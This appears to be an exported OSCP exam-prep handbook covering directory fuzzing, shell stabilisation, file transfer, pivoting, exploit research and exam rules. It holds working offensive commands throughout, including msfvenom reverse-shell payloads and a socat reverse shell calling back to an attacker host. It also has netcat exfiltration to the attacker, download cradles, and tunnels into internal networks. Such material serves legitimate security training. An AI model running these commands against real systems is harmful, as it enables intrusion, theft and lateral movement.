blocks.text: **Look for:** a 200 where the direct request was 403. **Common mistake:** spending 20 minutes on 403 bypasses before checking whether the same content is reachable at another vhost or port.

| Situation | Do this | Do **not** | | --- | --- | --- | | Fresh web server, no paths known | Step 03 with dirb/common | Start with a 30k list | | ffuf returns everything | Baseline (Step 02) + `-fs` | Add `-mc all` | | Only 403/500 responses | Size baseline + `-fc` (Step 08) | Assume the paths are fake | | Deep application | feroxbuster recursion (Step 05) | Scan by hand | | A domain is in scope | Both vhost (Step 12) **and** DNS (Step 14) | Pick one and stop | | Every Host header returns 200 | Wildcard filter (Step 15) | Report thousands of hosts | | HTTPS vhosts behave oddly | SNI check (Step 16) | Blame the tool | | Found a hostname | Add to `/etc/hosts`, restart at Step 03 | Only screenshot the name |

| Symptom | Cause | Fix | | --- | --- | --- | | ffuf: `all words match` | Wildcard / custom 404 | `-ac` or `-fs` | | gobuster: `the server returns a status code that matches the provided options for non existing urls` | Wildcard | `--wildcard` or switch to ffuf | | feroxbuster: thousands of hits | Wildcard, auto-filter failed | `-w` smaller list, `--filter-size` | | Vhost scan finds nothing | Wrong base domain or IP | `-u http://<DOMAIN>` • `--append-domain` | | DNS scan finds nothing | Wrong resolver | `-r <DOMAIN_CONTROLLER_IP>` | | Tool extremely slow | Through a pivot / many threads | Lower `-t`, raise `--timeout` | | 429 everywhere | Rate limit / WAF | `-rate 5`, randomise `-H User-Agent` |
**Pivoting variant.** All three tools are TCP-only and work through a proxy, but proxychains serialises connections — reduce concurrency and expect minutes, not seconds:

blocks.code:
proxychains4 ffuf -u http://<TARGET_IP>/FUZZ -w <WORDLIST> -t 5 -timeout 20 -ac
proxychains4 gobuster dir -u http://<TARGET_IP> -w <WORDLIST> -t 5
proxychains4 feroxbuster -u http://<TARGET_IP> -w <WORDLIST> -t 5

blocks.text: Alternatively run the scan **from** the pivot host (upload the wordlist, use `curl` loops) and pull the results back. If the target is only reachable through a SOCKS proxy and DNS is internal, add the hostname to `/etc/hosts` on Kali pointing at the target IP.

items: The exact command, wordlist path, and filter used.
The baseline 404 status and size.
The hit list, and for each hit the status, size, and a `curl -sI` of the path.
Vhost results **with** the default-vhost size they were compared against.
A note of any wildcard found, so the numbers are explainable later.

pages.title: Shells & File Transfer — Complete Command Reference
pages.description: get a usable interactive shell, then move files in both directions without guessing which cradle the target supports. One page: serve → download → upload → verify.

blocks.text: | Need | Tool | Runs on | | --- | --- | --- | | Stable TTY from a dumb shell | `python3 pty.spawn`, `socat` | target | | Serve a file over HTTP | `python3 -m http.server` | Kali | | Serve a file over SMB | `impacket-smbserver` | Kali | | Download on Linux | `wget`, `curl` | target | | Download on Windows | `certutil`, `IWR`, `copy` | target | | Upload to Linux | `scp` | target | | Upload to Windows | `nxc --put-file`, SMB share write | Kali / target | | Pull a file back | `nxc --get-file`, SMB share, base64 | Kali |
**Rule:** prefer HTTP for downloads, SMB for bulk or when HTTP is filtered, and base64 only for small text (keys, scripts). Never assume `certutil` exists just because the host is Windows.

commands.code:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# or, if python is absent
script -qc /bin/bash /dev/null

fields.lookFor: a prompt where arrow keys and `Ctrl-C` behave normally.
fields.decision: python3 exists → this is the fastest route. No python → `script`, then `socat` (Step 03).
fields.mistake: stopping at `pty.spawn` and not fixing the terminal — you get a TTY that still has no job control or echo.
fields.evidence: the command used and the resulting prompt.

commands.code:
# in the target shell
export TERM=xterm
stty rows 40 cols 160
# in Kali: background the shell, then
stty raw -echo; fg

fields.lookFor: `sudo`, `vim`, `nano` and `su` accepting input correctly; `Ctrl-C` not killing the shell.
fields.decision: still broken → Step 03 (socat gives a fully functional PTY).
fields.next: proceed with enumeration, or Step 03 if tools need a TTY.
fields.mistake: running `stty raw -echo` on the **target**. It belongs on **Kali** after you background the shell, then `fg`.
fields.evidence: the `stty -a` output on the target.

blocks.title: socat full TTY (when python is missing)

commands.code:
# Kali listener
socat file:`tty`,raw,echo=0 tcp-listen:<LOCAL_PORT>,reuseaddr
# target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER_IP>:<LOCAL_PORT>

fields.lookFor: a prompt with working job control and history.
fields.decision: `socat` is not on the target → upload a static binary (Step 04/05) or stay with `script`.
fields.mistake: forgetting `sane` on the target side — the terminal stays in raw mode after exit.
fields.evidence: the working prompt.

fields.lookFor: `Serving HTTP on 0.0.0.0 port …` and a `GET` line per download.
fields.decision: the target can reach you → this is the default channel. Target cannot reach Kali → see the pivoting note.
fields.mistake: starting the server in the wrong directory. Use `--directory` or `cd` first — the target sees only the current folder.
fields.evidence: the access log line for the transferred file.

commands.code:
impacket-smbserver share $(pwd) -smb2support -username <USERNAME> -password <PASSWORD>
# Windows target
copy \\<ATTACKER_IP>\share\<FILE> C:\Windows\Temp\<FILE>

fields.lookFor: `Config file` / `Serving` lines and the file appearing on the target.
fields.decision: HTTP is blocked but 445 outbound works → SMB. Modern Windows refuses guest SMB → always set `-username`/`-password`.
fields.mistake: running smbserver without credentials on a hardened host — Windows blocks insecure guest auth by default.
fields.evidence: the SMB log and the transferred file.

blocks.title: Netcat: banner grab and ad-hoc transfer

commands.code:
# banner grab
nc -nv <TARGET_IP> <TARGET_PORT>
# receive a file (Kali)
nc -lvnp <LOCAL_PORT> > <OUTPUT_FILE>
# send a file (target)
nc <ATTACKER_IP> <LOCAL_PORT> < <FILE>

fields.lookFor: the service banner, or a completed file with matching size.
fields.decision: no banner → the port may be filtered or TLS-wrapped; use `openssl s_client`.
fields.mistake: omitting `-l` and accidentally connecting out instead of listening, or omitting `-n` so netcat stalls on DNS. `nc -lvnp <LOCAL_PORT>` works on this build (verified); `nc -l -p <LOCAL_PORT>` is the equivalent long form.
fields.evidence: the banner text or the received file hash.

commands.code:
wget http://<ATTACKER_IP>:<LOCAL_PORT>/<FILE> -O /tmp/<FILE>
# optional: headers only, or mirror a site
wget --server-response http://<ATTACKER_IP>:<LOCAL_PORT>/<FILE>
wget --mirror http://<TARGET_IP>/

fields.lookFor: `'<FILE>' saved` and the expected byte count.
fields.decision: wget missing → Step 08 (curl) or `python3 -c` with urllib.
fields.mistake: forgetting `-O /tmp/<FILE>` — the file lands in the current directory with a name derived from the URL.
fields.evidence: the saved path and `ls -l`.

fields.lookFor: the file on disk, no HTML error page.
fields.decision: curl missing → `wget`, or `busybox wget` on embedded systems.
fields.mistake: downloading an error page because the URL is wrong — always check the size and `file` type before running it.
fields.evidence: `ls -l` and `file /tmp/<FILE>`.

commands.code:
# upload from Kali
scp <FILE> <USERNAME>@<TARGET_IP>:/tmp/<FILE>
# download to Kali
scp <USERNAME>@<TARGET_IP>:/tmp/<FILE> <OUTPUT_DIR>/
# non-standard port
scp -P <TARGET_PORT> <FILE> <USERNAME>@<TARGET_IP>:/tmp/<FILE>

fields.lookFor: a progress bar and the file at the destination.
fields.decision: SSH is open and you have a password or key → fastest bidirectional channel.
fields.mistake: using `-p` for the port. In scp the port flag is capital `-P`; lowercase preserves timestamps.
fields.evidence: the scp output and destination listing.

fields.lookFor: `CertUtil: -URLCache command completed successfully` and the file in `Temp`.
fields.decision: certutil is blocked by AV/AppLocker → Step 11 or Step 12.
fields.mistake: omitting `-split -f` — without them certutil may cache instead of writing the file where you expect.
fields.evidence: the certutil output and `dir C:\Windows\Temp`.

commands.code:
IWR -Uri http://<ATTACKER_IP>:<LOCAL_PORT>/<FILE> -OutFile C:\Windows\Temp\<FILE>
Invoke-WebRequest -Uri http://<ATTACKER_IP>:<LOCAL_PORT>/<FILE> -OutFile C:\Windows\Temp\<FILE>

fields.lookFor: no error and the file present.
fields.decision: `IWR` blocked by script policy → `powershell -ep bypass -c "IWR …"` or Step 12.
fields.mistake: using `-OutFile` with a relative path from a shell whose working directory you do not control. Always use the full `C:\…` path.
fields.evidence: `Get-Item` on the downloaded file.

commands.code:
copy \\<ATTACKER_IP>\share\<FILE> C:\Windows\Temp\<FILE>
# or pull a specific file back to Kali
nxc smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --get-file \Windows\Temp\<FILE>./<FILE>

fields.lookFor: `1 file(s) copied` / the file appearing locally.
fields.decision: outbound 445 works → this is the most reliable Windows channel. No SMB → HTTP cradles.
fields.mistake: forgetting the double backslash prefix for a UNC path (`\\<ATTACKER_IP>\share`), which turns it into a local path.
fields.evidence: the copy output and the file hash.

fields.lookFor: `File <FILE> was uploaded` or no error, and the file on the target.
fields.decision: you have SMB admin → push without touching the target's download tools. No admin → use an HTTP/WMI method.
fields.mistake: passing a full `C:\…` path where nxc expects a share-relative path (`\Windows\Temp\<FILE>`). Check the version's help.
fields.evidence: the nxc output and `dir` on the target.

commands.code:
# encode (Linux)
base64 -w0 <FILE> > <OUTPUT_FILE>
# decode (Linux target)
base64 -d <OUTPUT_FILE> > <FILE>
# decode (Windows PowerShell)
[IO.File]::WriteAllBytes("C:\Windows\Temp\<FILE>",[Convert]::FromBase64String("<BASE64_BLOB>"))

fields.lookFor: the decoded file's hash matching the source.
fields.decision: no network egress and only a text channel (RDP clipboard, web shell) → base64. Large binaries → split into chunks and reassemble.
fields.mistake: pasting a wrapped base64 blob. Use `-w0` to disable line wrapping, or the Windows decode fails silently.
fields.evidence: matching hashes on both ends.

commands.code:
md5sum <FILE>
sha256sum <FILE>
# Windows
certutil -hashfile C:\Windows\Temp\<FILE> SHA256
Get-FileHash C:\Windows\Temp\<FILE> -Algorithm SHA256

fields.lookFor: identical hashes on Kali and the target.
fields.decision: mismatch → the transfer truncated (text mode, base64 wrapping, or an error page). Re-send with a binary-safe method.
fields.next: execute the file, or attach the hash to your notes.
fields.mistake: comparing hashes of a file that was modified by the target (line-ending conversion). Hash the exact artifact you will use.
fields.evidence: both hash outputs side by side.

blocks.text: | Situation | Do this | Do **not** | | --- | --- | --- | | Dumb shell, python present | `pty.spawn` • `stty` (Steps 01-02) | Work in a shell without job control | | Linux target, HTTP outbound | `wget`/`curl` (Steps 07-08) | Try certutil on Linux | | Windows target, HTTP outbound | certutil or IWR (Steps 10-11) | Assume PowerShell is unrestricted | | HTTP filtered, SMB open | smbserver + `copy` (Steps 05/12) | Use guest SMB on modern Windows | | Have SMB admin | `nxc --put-file` (Step 13) | Upload by hand | | Only a text channel | base64 (Step 14) | Paste a wrapped blob | | Need a file **back** | `nxc --get-file`, SMB, or base64 | Screenshot the content | | Transfer "worked" but file won't run | Wrong architecture / truncation | Re-run it blindly |

| Symptom | Cause | Fix | | --- | --- | --- | | Downloaded file is HTML | Wrong URL / 404 page | Check the server log and `file` output | | `Permission denied` executing | No `+x` bit | `chmod +x <FILE>` | | `Text file busy` | File running or mounted noexec | Copy to `/tmp` and `chmod` | | certutil writes nothing | Cached / wrong flags | `-urlcache -split -f` | | SMB `access denied` | Guest blocked | Add `-username`/`-password` | | scp `connection refused` | SSH not open | Use HTTP/SMB, or another port | | base64 decode fails | Line wrapping / bad padding | `-w0`, verify length multiple of 4 | | Transfer stalls on large file | Timeout / MTU | Split with `split`, or use SMB |
**Pivoting variant.** If the target can only reach the **pivot**, do not serve from Kali. Either upload the tool to the pivot and serve it there, or reverse-forward Kali's server onto the pivot:

blocks.code:
# on Kali — expose local 8000 on the pivot's 8000
ssh -R 8000:127.0.0.1:8000 <USERNAME>@<PIVOT_IP>
# on the target — download through the pivot
wget http://<PIVOT_IP>:8000/<FILE> -O /tmp/<FILE>

blocks.text: `scp` through a proxy needs a ProxyCommand; simpler to use `nxc --put-file`/`--get-file` or SMB, which ride the existing tunnel without extra configuration.

items: The cradle command and the server-side log line proving the transfer.
The file hash on both ends.
For shells: the stabilisation sequence that made the TTY usable.
Where the file was written on the target (full path).
HackTricks file transfer: [https://book.hacktricks.wiki/en/generic-hacking/exfiltration-os-command.html](https://book.hacktricks.wiki/en/generic-hacking/exfiltration-os-command.html)
Impacket smbserver: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
NetExec wiki: [https://www.netexec.wiki/](https://www.netexec.wiki/)

blocks.text: `wget`, `curl`, `scp`, `python3 -m http.server`, `impacket-smbserver`, `nxc`, `nc`, `socat`, `base64` and `md5sum` are installed here and their flags were checked against local help, so those steps are **Syntax Checked**. Windows built-ins (`certutil`, `IWR`, `copy`) are documented syntax, also **Syntax Checked**; the `socat` TTY sequence was not executed against a live target and is **Documented — Untested**. Nothing was executed against a live target for this page, so no step is **Lab Tested**.

pages.title: Tunneling & Pivoting — Complete Command Reference
pages.description: reach a host your Kali cannot route to — by making a host you already control carry the traffic. Pick the smallest tunnel that answers the question, and know which side listens.

blocks.text: | Situation | Use | Listens on | | --- | --- | --- | | One port on the pivot's [localhost](http://localhost) | `ssh -L` (Step 01) | Kali | | Expose a Kali service to the target network | `ssh -R` (Step 02) | pivot / target | | Many ports, many hosts | SOCKS: `ssh -D` or chisel (Steps 03-06) | Kali | | Whole subnet, no per-tool flags | `sshuttle` (Step 10) | Kali (needs root) | | No SSH, quick single relay | `socat` (Step 08) | Kali | | Windows pivot, no extra binaries | `netsh portproxy` (Step 09) | Windows pivot |

**Two questions before any tunnel:** *what does the pivot reach that Kali does not?* and *which direction is the connection allowed?* Most failures are a listener bound to `127.0.0.1` when the client connects from outside.

commands.code:
ssh -L <LOCAL_PORT>:127.0.0.1:<REMOTE_PORT> <USERNAME>@<TARGET_IP>
# example: reach the pivot's local MySQL on Kali:3306
ssh -L 3306:127.0.0.1:3306 <USERNAME>@<TARGET_IP>

fields.lookFor: a normal SSH session; while it stays open, `127.0.0.1:<LOCAL_PORT>` on Kali reaches `<REMOTE_PORT>` **as seen from the pivot**.
fields.decision: the service is on another internal host → point the middle at that host: `ssh -L <LOCAL_PORT>:<INTERNAL_IP>:<REMOTE_PORT> <USERNAME>@<TARGET_IP>`.
fields.mistake: assuming the forward reaches Kali's network. The right-hand side is resolved **from the pivot**, not from Kali.
fields.evidence: the SSH session plus a successful connection to the forwarded port.

commands.code:
ssh -R <REMOTE_PORT>:127.0.0.1:<LOCAL_PORT> <USERNAME>@<TARGET_IP>
# example: make Kali's HTTP server reachable on the target network
ssh -R 8080:127.0.0.1:8000 <USERNAME>@<TARGET_IP>

fields.lookFor: traffic to `<TARGET_IP>:<REMOTE_PORT>` arriving at Kali's `127.0.0.1:<LOCAL_PORT>`.
fields.decision: internal hosts must reach your payload server → this is the pattern (serve from Kali, forward onto the pivot).
fields.next: start the Kali service first, then open the tunnel.
fields.mistake: `GatewayPorts no` (the default) binds the remote listener to `127.0.0.1` on the pivot — only the pivot itself can use it. Add `-R 0.0.0.0:<REMOTE_PORT>:…` only if the server allows it.
fields.evidence: a `curl` from the pivot to `127.0.0.1:<REMOTE_PORT>`.

fields.lookFor: a SOCKS proxy on `127.0.0.1:1080` that exits at the pivot.
fields.decision: more than one port or host to reach → SOCKS. One port → `ssh -L` is simpler.
fields.mistake: forgetting `-N -f`: without them you get an interactive shell and no background proxy.
fields.evidence: `ss -tlnp | grep 1080` on Kali.

commands.code:
echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf
proxychains4 nmap -Pn -sT -p 445,3389 <INTERNAL_IP>
proxychains4 nxc smb <INTERNAL_IP> -u <USERNAME> -p <PASSWORD>

fields.lookFor: the tool's output arriving through the proxy, and `|S-chain|-<>-` lines when `-q` is not set.
fields.decision: DNS fails inside the proxy → enable `proxy_dns` in the config, or use IP addresses only.
fields.next: run the actual enumeration tool through it.
fields.mistake: using a SYN scan (`-sS`) through proxychains. A SOCKS proxy carries **TCP connect** only — use `-sT`, and `-Pn` because ICMP is not proxied.
fields.evidence: the proxychains command and its successful output.

fields.lookFor: `server: Listening on https://0.0.0.0:<LOCAL_PORT>`.
fields.decision: the pivot can reach Kali outbound → this is the most reliable pivot when SSH is closed.
fields.mistake: running the server without `--reverse` and then trying an `R:` client connection — reverse tunnels are rejected.
fields.evidence: the server log showing a client connection.

commands.code:
# upload chisel to the pivot first, then
chisel client <ATTACKER_IP>:<LOCAL_PORT> R:socks

fields.lookFor: `client: Connected` and a SOCKS proxy on Kali at `127.0.0.1:1080`.
fields.decision: need a single port instead of SOCKS → `chisel client <ATTACKER_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:127.0.0.1:<SERVICE_PORT>`.
fields.mistake: assuming the SOCKS port is configurable on the client in `R:socks` form — chisel uses 1080 by default; specify `R:1081:socks` to change it.
fields.evidence: the client log and a proxied request.

commands.code:
socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<TARGET_IP>:<REMOTE_PORT>
# bind to all interfaces so other hosts can use it
socat TCP-LISTEN:<LOCAL_PORT>,fork,bind=0.0.0.0 TCP:<TARGET_IP>:<REMOTE_PORT>

fields.lookFor: connections to `<LOCAL_PORT>` being relayed to `<TARGET_IP>:<REMOTE_PORT>`.
fields.decision: need many ports → SOCKS. Need one port and no SSH/chisel → socat.
fields.mistake: omitting `fork` — socat then handles exactly one connection and exits.
fields.evidence: a successful connection through the relay.

commands.code:
netsh interface portproxy add v4tov4 listenport=<LOCAL_PORT> listenaddress=0.0.0.0 connectport=<REMOTE_PORT> connectaddress=<TARGET_IP>
netsh interface portproxy show all
netsh advfirewall firewall add rule name="portproxy" dir=in action=allow protocol=TCP localport=<LOCAL_PORT>

fields.lookFor: the rule listed by `show all`, and the port reachable from Kali.
fields.decision: you have admin on a Windows host that reaches the internal subnet → portproxy, no binaries needed.
fields.mistake: adding the portproxy but not the firewall rule, then concluding it does not work. Both are required.
fields.evidence: `show all` output and a successful connection.

commands.code:
sshuttle -r <USERNAME>@<TARGET_IP> <TARGET_IP>/24
# typical: route the internal subnet
sshuttle -r <USERNAME>@<TARGET_IP> 10.10.10.0/24

fields.lookFor: `c: Connected to server` and direct tool usage with **no** proxychains prefix.
fields.decision: you have SSH and root on Kali, and want transparent routing for every tool → sshuttle. No root or no SSH → SOCKS.
fields.next: run tools normally against the routed subnet.
fields.mistake: passing the pivot's own `/24` instead of the **internal** subnet you need. Also: sshuttle needs Python on the pivot.
fields.evidence: a successful direct connection to an internal host.

commands.code:
# SSH jump host, then SOCKS that exits at the second pivot
ssh -D 1080 -J <USERNAME>@<PIVOT1_IP> <USERNAME>@<PIVOT2_IP>
# or chain a second chisel hop through the first SOCKS

fields.lookFor: `127.0.0.1:1080` now exiting inside the second network.
fields.decision: each additional hop adds latency and failure points — only add one when the target is genuinely unreachable from the first pivot.
fields.next: re-run Step 04 against the new exit.
fields.mistake: stacking proxychains on proxychains. One SOCKS entry that already exits deep enough is cleaner than two.
fields.evidence: the hop chain and a request that only succeeds through it.

commands.code:
proxychains4 -q curl -s -o /dev/null -w "%{http_code}\n" http://<INTERNAL_IP>/

fields.lookFor: a real status code or a valid SMB response — not a timeout.
fields.decision: timeout → the pivot cannot reach the target, or the listener is bound to `127.0.0.1`. Test from the pivot itself first.
fields.evidence: the successful proxied request.

pages.title: Exploit Research & Payload Handling — Complete Command Reference
pages.description: find a public exploit for the exact version you enumerated, adapt it, generate a matching payload, and catch the shell. The goal is a **working** exploit, not the first search result.

items: Metasploit modules and Meterpreter are restricted to **one target machine** per exam attempt. Manual exploits, `searchsploit`, and payload generation are a separate question — **confirm with the current official guide** before relying on either.
Once you use Metasploit on a machine, that budget is spent. Prefer the manual exploit when one exists.
See **OSCP Exam Rules & Tool Restrictions** for the current wording.

fields.lookFor: entries matching **both** product and version, with a path under `exploits/`.
fields.decision: an exact-version match → Step 02. Only "close" versions → read the exploit's requirements before using it.
fields.mistake: searching with the wrong product string (`apache` vs `httpd`). Search once by product, once by CVE.
fields.evidence: the search line and the chosen EDB-ID.

fields.lookFor: hard-coded target IPs, ports, offsets, and required libraries at the top of the file.
fields.decision: the exploit needs a specific version/library → verify the target matches. Mismatch → keep looking.
fields.next: edit the variables (Step 13), then run it.
fields.mistake: running a copied exploit unchanged against a different target IP/port. Read the header first — it usually names the exact version tested.
fields.evidence: the exploit source and the requirements it states.

fields.lookFor: a module whose `Disclosure Date` and description match the target version.
fields.decision: using it consumes the one-machine Metasploit allowance → decide deliberately. A manual equivalent exists? Use that instead.
fields.mistake: using Metasploit on the first box "because it is easier", then needing it on the box where it is the only path.
fields.evidence: the module name and the reason you chose it.

commands.code:
searchsploit -u
# then look at the vendor advisory / GitHub PoC for the exact version

fields.lookFor: a CVE in the service banner, then a public PoC that names the same version.
fields.decision: no exploit exists → the intended path is probably a misconfiguration, not a CVE. Return to enumeration.
fields.next: configuration-based attacks (credentials, shares, web app logic).
fields.mistake: forcing an unrelated exploit because it is the only result. A failed exploit attempt can crash the service.
fields.evidence: the CVE and the PoC you evaluated.

blocks.title: Choose the right payload
blocks.notes:
| Target | Payload | Format |
| --- | --- | --- |
| Linux x64 | `linux/x64/shell_reverse_tcp` | `elf` |
| Windows x64 | `windows/x64/shell_reverse_tcp` | `exe` |
| PHP web app | `php/reverse_php` | `raw` |
| [ASP.NET](http://ASP.NET) | `windows/x64/shell_reverse_tcp` | `aspx` |
| Java/Tomcat | `java/jsp_shell_reverse_tcp` | `war` |
**Staged vs stageless:** `…/meterpreter/reverse_tcp` is staged (small stager, then the rest); `…/shell_reverse_tcp` is stageless (one file, no handler sophistication needed). For a plain shell, prefer stageless — fewer moving parts.

commands.code:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LOCAL_PORT> -f elf -o shell.elf
chmod +x shell.elf

fields.lookFor: `Payload size: …` and the file on disk.
fields.decision: target is 32-bit → `linux/x86/shell_reverse_tcp`. ARM → `linux/armle/…`.
fields.mistake: wrong architecture. `file shell.elf` and `uname -m` on the target must agree.
fields.evidence: the msfvenom output and `file` on the payload.

commands.code: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LOCAL_PORT> -f exe -o shell.exe

fields.lookFor: a valid PE file (`file shell.exe` → `PE32+ executable`).
fields.decision: Defender removes it on transfer → the payload is not the intended path; use a living-off-the-land technique or another vector.
fields.mistake: assuming an encoder makes the payload undetectable. It does not — encoding changes bytes, not behaviour.
fields.evidence: the payload hash and transfer method.

commands.code:
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<LOCAL_PORT> -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LOCAL_PORT> -f war -o shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LOCAL_PORT> -f aspx -o shell.aspx

fields.lookFor: a file the server will execute (correct extension and handler).
fields.decision: upload works but no callback → the file was stored, not executed. Find the execution path.
fields.next: request the file through the web server.
fields.mistake: using `-f raw` for PHP without the `<?php` wrapper expectations — check the generated file before uploading.
fields.evidence: the uploaded path and the callback log.

commands.code: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LOCAL_PORT> -e x64/xor_dynamic -i 5 -f exe -o shell.exe

fields.lookFor: a payload that still executes.
fields.decision: encoding exists to avoid bad characters (e.g. `�` in a buffer), **not** to bypass AV. For AV, change technique.
fields.next: test execution before relying on it.
fields.mistake: spending an hour encoding against Defender. It will still be caught.
fields.evidence: the encoder rationale (bad characters) and the test result.

fields.lookFor: `Connection received on …` and a prompt.
fields.decision: no callback → check LHOST (must be reachable from the target), firewall, and that the payload uses the same port.
fields.next: stabilise the shell (Shells & File Transfer, Steps 01-02).
fields.mistake: using `127.0.0.1` or the wrong interface as LHOST. Use `ip a` to confirm the address on the interface that reaches the target.
fields.evidence: the listener output and the prompt.

blocks.title: Metasploit handler (only if you chose MSF)

commands.code: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT <LOCAL_PORT>; run"

fields.lookFor: `Command shell session 1 opened`.
fields.decision: staged payload → the payload string in the handler must match exactly, including `meterpreter`.
fields.mistake: handler payload mismatch (`shell_reverse_tcp` vs `meterpreter/reverse_tcp`) — the session opens and immediately dies.
fields.evidence: the session line and `sessions -i 1`.

commands.code:
ip a show <INTERFACE>
nc -lvnp <LOCAL_PORT> # in one terminal
nc -vz <ATTACKER_IP> <LOCAL_PORT> # from a host in the same network position

fields.lookFor: a successful connection to the listener **from the target's network position**.
fields.decision: fails → routing/firewall. On a pivot, the callback must reach the pivot, not Kali (see below).
fields.mistake: testing reachability from Kali to Kali. That proves nothing about the target's path.
fields.evidence: the successful test connection.

commands.code:
gcc exploit.c -o exploit
gcc -m32 exploit.c -o exploit32
gcc -static exploit.c -o exploit-static

fields.lookFor: a successful build with no missing headers.
fields.decision: missing `libc6-dev-i386` for `-m32` → install it, or compile on the target. Python exploit → `2to3 -w` if it is Python 2.
fields.next: run it with the documented arguments.
fields.mistake: compiling dynamically and running on a target with a different glibc. `-static` avoids that.
fields.evidence: the build command and `file` on the binary.

blocks.title: Adapt checklist

fields.lookFor: a `Usage:` line or a header comment listing required arguments.
fields.decision: the exploit expects a value you do not have (offset, cookie, session) → you are missing reconnaissance, not a step.
fields.next: run it and read the output, not just the shell.
fields.mistake: ignoring the exploit's own error messages. `404`, `connection reset`, and `bad chars` each point to a different fix.
fields.evidence: the exact command and full output of the successful run.

blocks.notes: Before every run, confirm: target IP, port, protocol (HTTP vs HTTPS), path, credentials, architecture, and any offset or buffer length the exploit expects.

| Symptom | Cause | Fix | | --- | --- | --- | | Listener never receives | Wrong LHOST / firewall | `ip a`, test with `nc -vz` | | Shell connects then dies | Payload/handler mismatch | Match staged vs stageless | | `Text file busy` | Previous run still executing | `kill` it, or copy the file | | msfvenom `invalid payload` | Payload name typo | \`msfvenom -l payloads | | Exploit crashes the service | Version mismatch | Revert snapshot before retrying | | `bad chars` in buffer | Null bytes / encoder needed | Encode or adjust the buffer | | No such file `searchsploit` path | ExploitDB path | `searchsploit -p <ID>` for the full path |
**Pivoting variant.** If the target can only reach a pivot, the payload's LHOST must be the **pivot**, not Kali, and you need a listener on the pivot plus a forward back to Kali:

ssh -R <LOCAL_PORT>:127.0.0.1:<LOCAL_PORT> <USERNAME>@<PIVOT_IP>
# payload generated with LHOST=<PIVOT_IP>
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<PIVOT_IP> LPORT=<LOCAL_PORT> -f elf -o shell.elf

pages.title: OSCP Attack Workflow — Start Here
pages.description: one ordered route through this handbook — from "VPN up" to "report submitted" — with a time box and a single next action for every phase.

items: Work **top to bottom**. Do not jump to exploitation before enumeration has produced a version, a credential or a reachable path.
Every phase names the page to open next.
Time boxes assume the 23h45m exam and 5 machines. Stretch them for practice; keep the order.

rows: note the exam start time; 23:45 later is the hard stop
read the **specific objectives** for each machine
one page per machine, using the Machine Notes template

blocks.code:
mkdir -p ~/exam/{recon,loot,notes,report}
sudo openvpn <VPN_FILE>.ovpn &
sleep 5
ip a | grep -A1 tun0

blocks.text: **Decision:** no `tun0` → reconnect before doing anything else. A broken tunnel looks exactly like a dead host.

items: **Is it up?** `ping -c 3 <TARGET_IP>`; if silent, scan with `-Pn` anyway.
**Full TCP range** — not just the top 1,000: `sudo nmap -p- --min-rate 5000 -T4 -oA <OUTPUT_DIR>/tcp_full <TARGET_IP>`.
**Version + default scripts** on the ports that answered: `sudo nmap -sCV -p <TARGET_PORT> -oA <OUTPUT_DIR>/svc <TARGET_IP>`.
**UDP** when the host looks sparse or the services suggest it (SNMP, DNS, IPMI): `sudo nmap -sU --top-ports 50 <TARGET_IP>`.
**Route each service to its page:**

rows: script lookup, then the service's own client

blocks.text: **Decision:** full scan empty or only one odd port → re-scan with `-T3` (packet loss causes false negatives), check UDP, then move on. Do not spend two hours on a host that has nothing.
Work in this order — each step is cheaper and more reliable than the next:

items: **Known-vulnerable version** → research the exact build, read the exploit, then run it.
**Reuse found credentials** across every service (SMB → WinRM → RDP → SSH → web login). This is the most common intended path.
**Misconfiguration** — anonymous FTP, null SMB session, writable share, open NFS, exposed Git or backup files.
**Web application flaw** — upload, traversal, IDOR, default login, exposed admin panel.
**Brute force** — last resort, and only after reading the password policy.

blocks.text: **Rules that save points:**

items: Read every exploit before running it; note its prerequisites.
Capture the proof the moment you land — shells die, reverts happen.
Never leave a box in a broken state for a later objective.
Keep a revert log; you have 24 reverts, resettable once.

pages.title: OSCP Exam Rules & Tool Restrictions
pages.description: **Source:** OffSec **OSCP+ Exam Guide**, [help.offsec.com](http://help.offsec.com) article 360040165632 — guide last updated **21 October 2026**, checked **22 October 2026**. If your exam is later, re-read the guide before relying on anything here. **Everything below is a summary, not a substitute.** Rules change. When this page and the official guide disagree, the official guide wins — and you are responsible for knowing it.

blocks.text: | Item | Value | | --- | --- | | Exam time | **23 hours 45 minutes** | | Report upload window | **24 hours** after the exam ends | | Machines | 3 standalone + 1 AD set of 3 machines | | Points | standalone 20 each (10 initial + 10 privesc) = 60 · AD set 10 + 10 + 20 = 40 | | Maximum raw points | **100** | | Proctoring | All exams proctored | | Connection | Kali Linux over OpenVPN, using the supplied `.ovpn` file |
**AD set:** you are **given a username and password**, simulating a breach. You are not expected to break in from nothing.
**Point allocation:** machines are graded in the order you document them; each has specific objectives listed in the exam control panel.

**Pass mark:** this version of the guide states the 100-point maximum and that **scaled scoring** applies to exams starting on or after **1 December 2026, 08:00 GMT** (see the OSCP+ Scaled Scoring FAQ). It does not restate a raw pass threshold — **confirm the current pass rule in the guide/FAQ before your exam** rather than relying on the old 70/100 figure.

sections.title: Proof rules — where most points are lost
sections.rawTitle: Proof rules — where most points are lost

items: Each target has at least one proof file: `local.txt` (unprivileged) and `proof.txt` (root/Administrator).
You must submit the file **contents in the control panel before the exam ends**.
You must also show the contents **in a screenshot**, together with the **target IP** from `ipconfig`, `ifconfig` or `ip addr`.
Read the file **from its original location**, using `cat` or `type`, in an **interactive shell**.
**A web shell, or any other retrieval method, scores zero for that machine.**
